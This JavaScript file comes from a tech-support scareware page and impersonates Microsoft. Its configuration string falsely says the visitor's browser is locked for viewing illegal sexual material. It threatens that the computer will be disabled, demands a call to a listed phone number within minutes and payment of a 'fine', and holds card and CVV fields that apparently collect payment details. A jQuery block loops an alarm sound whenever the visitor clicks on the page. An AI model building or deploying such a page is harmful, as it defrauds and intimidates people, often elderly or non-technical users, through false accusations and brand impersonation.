var dfbnhfj = '{"title": "Microsoft Corporation",' +
    '"alertMsg":"<b>Your computer has been blocked</b>",' +
    '"mouseLock": "true",' +
    '"selector":"#pagesdfsdfsdf",' +
    '"successLnkTitle": "download receipt",' +
    '"url" : "https://www.microsoft.com",' +
    '"resolution": "",' +
    '"secondBlock": "<b>Call Us : +1-855-509-3171</b><br><b>Your browser has been locked</b>  due to ' +
    'Your browser has been locked due to viewing and dissemination of materials forbidden by law of United states,' +
    'namely pornography with pedophilia, rape and zoophilia,<br>In order to unlocking you should contact to our support agent within next 5 minutes.<br>",' +
    '"cardPlaceholder": "", ' +
    '"cvvPlaceholder": "", ' +
    '"fourthBlock": "<br><b>Attention!</b> If you shutdown this page, access to your computer will be disabled to prevent futher damage to our network.", "timeText": "You have 6 hours to pay the fine.", "timer": "Access code received by SMS"}';
    $(document).ready(function() {
        var audioElement = document.createElement('audio');
        audioElement.setAttribute('src', 'assets/mp3/sound.mp3');
    
        audioElement.addEventListener('ended', function() {
            this.play();
        }, false);
    
    
         $('.am confirm-dialog-overlay').click(function() {
            audioElement.play();
    
        });
    
          $('.pagesdfsdfsdf').click(function() {
            audioElement.play();
    
        });
    
    
           $('#footer').click(function() {
            audioElement.play();
    
        });
    
            $('#poptxt').click(function() {
            audioElement.play();
    
        });
    
    
    
    
    
    });
